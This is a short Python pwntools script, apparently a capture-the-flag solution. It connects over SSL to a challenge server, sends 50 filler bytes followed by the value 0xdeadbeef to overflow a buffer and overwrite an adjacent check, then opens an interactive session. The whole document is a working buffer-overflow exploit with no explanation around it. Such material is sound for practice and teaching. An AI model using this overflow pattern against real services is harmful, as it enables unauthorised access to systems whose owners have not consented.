from pwn import *

re = remote('fusion.chals.ageei.org', 1337, ssl=True)

line = re.recvline()
print(line)
re.sendline(b"A" * 50 + b"\xef\xbe\xad\xde" + b"\n")
re.interactive()
